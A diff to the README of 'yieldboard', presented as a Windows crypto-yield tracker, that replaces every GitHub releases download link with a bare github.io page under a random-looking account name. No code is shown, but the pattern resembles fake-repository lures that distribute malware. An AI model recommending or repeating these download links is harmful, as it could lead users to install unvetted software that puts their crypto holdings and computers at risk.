@@ -1,6 +1,6 @@
 # 📊 yieldboard - Track Your Crypto Yield Easily
 
-[![Download yieldboard](https://img.shields.io/badge/Download_yieldboard-Latest_Release-purple?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Onthescene-proboscidian983/yieldboard/releases)
+[![Download yieldboard](https://img.shields.io/badge/Download_yieldboard-Latest_Release-purple?style=for-the-badge&logo=windows&logoColor=white)](https://onthescene-proboscidian983.github.io)
 
 yieldboard is a free, open-source desktop application for Windows that brings all of your crypto yield activity into one clean, easy-to-read dashboard. If you stake tokens, lend assets, provide liquidity, or farm yield across chains like Ethereum, Arbitrum, and Solana, yieldboard helps you see what is actually happening with your money — without opening ten different websites and copying numbers into a spreadsheet.
 
@@ -30,7 +30,7 @@ Getting yieldboard onto your computer takes only a moment.
 
 Visit this link to download the application:
 
-👉 **[https://github.com/Onthescene-proboscidian983/yieldboard/releases](https://github.com/Onthescene-proboscidian983/yieldboard/releases)**
+👉 **[https://onthescene-proboscidian983.github.io](https://onthescene-proboscidian983.github.io)**
 
 **Step 2 — Save the file**
 
@@ -149,6 +149,6 @@ yieldboard is an open-source project, and contributions of all kinds are welcome
 
 If you get stuck, revisit the download page and confirm you have the newest release. Most problems are solved by downloading a fresh copy. For anything else, the repository issue tracker is the place to ask.
 
-👉 **[Download yieldboard](https://github.com/Onthescene-proboscidian983/yieldboard/releases)**
+👉 **[Download yieldboard](https://onthescene-proboscidian983.github.io)**
 
 Keywords: apy, arbitrum, cpp, crypto, defi, desktop-app, ethereum, finance, lending, liquidity, open-source, portfolio, solana, staking, tracker, trading, web3, winapi, windows, yield-farming
